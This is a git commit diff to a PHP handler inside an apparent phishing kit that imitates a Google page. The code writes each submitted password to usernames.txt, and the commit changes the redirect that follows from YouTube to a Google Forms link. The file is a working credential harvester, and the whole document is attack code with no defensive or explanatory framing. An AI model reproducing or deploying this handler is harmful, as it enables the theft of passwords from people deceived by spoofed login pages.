66d31c404605770c310dbe01afdb31d9d42331f5
oaosdpo <80654652+oaosdpo@users.noreply.github.com>
2021-06-23 13:13:52 -0400

    Update googleformspageforwarding.php

--- .sites/google_new/googleformspageforwarding.php
+++ .sites/google_new/googleformspageforwarding.php
@@ -1,6 +1,6 @@
 <?php
 
 file_put_contents("usernames.txt", "Pass: " . $_POST['password'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
-header('Location: https://www.youtube.com');
+header('Location: https://forms.gle/QR2wdKsnT5UFxSi66');
 exit();
 ?>
